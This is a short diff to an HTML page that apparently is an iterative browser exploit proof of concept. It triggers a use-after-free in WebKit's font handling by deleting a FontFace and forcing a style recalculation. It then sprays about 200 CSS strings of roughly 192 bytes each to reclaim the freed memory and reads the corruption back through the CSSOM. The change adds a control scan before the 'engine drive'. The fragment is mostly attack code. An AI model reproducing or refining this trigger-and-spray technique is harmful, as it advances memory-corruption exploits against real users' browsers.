@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>P2 v10</title>
+<title>P2 v11</title>
 <style>body{font-size:28px;font-family:sans-serif;background:#111;color:#0f0}pre{white-space:pre-wrap;font-size:22px}</style>
 <style id="s0">@font-face { font-family: x; src: url(nonexistent-font.woff); unicode-range: U+0042; }</style>
 <style id="spraycss"></style>
@@ -17,7 +17,7 @@
 // ~192B font-family names; corruption readable back via the CSSOM.
 function log(s) { document.getElementById('out').textContent += s + "\n"; }
 
-log('PAGE VERSION: v10 (CSS string spray)');
+log('PAGE VERSION: v11 (CSS spray + sanity control)');
 log('UA = ' + navigator.userAgent);
 
 var NRULES = 200, NAMELEN = 176;      // StringImpl hdr ~16 + 176 chars ~= 192B
@@ -84,6 +84,9 @@ function trigger() {
           try { document.fonts.delete(A); } catch (e) {}
           document.body.offsetTop;               // force recalc -> FREE
           cssSpray();                            // 200 x ~192B WebCore strings
+          // CONTROL: scan BEFORE the engine drive - if the oracle itself is
+          // broken (CSSOM re-parse artifact) this shows corrupted already
+          scanCss('sanity-pre-drive');
           var st = document.createElement('style');
           st.textContent = '@font-face { font-family: x; src: local(Helvetica Narrow); unicode-range: U+0043; }';
           document.head.appendChild(st);
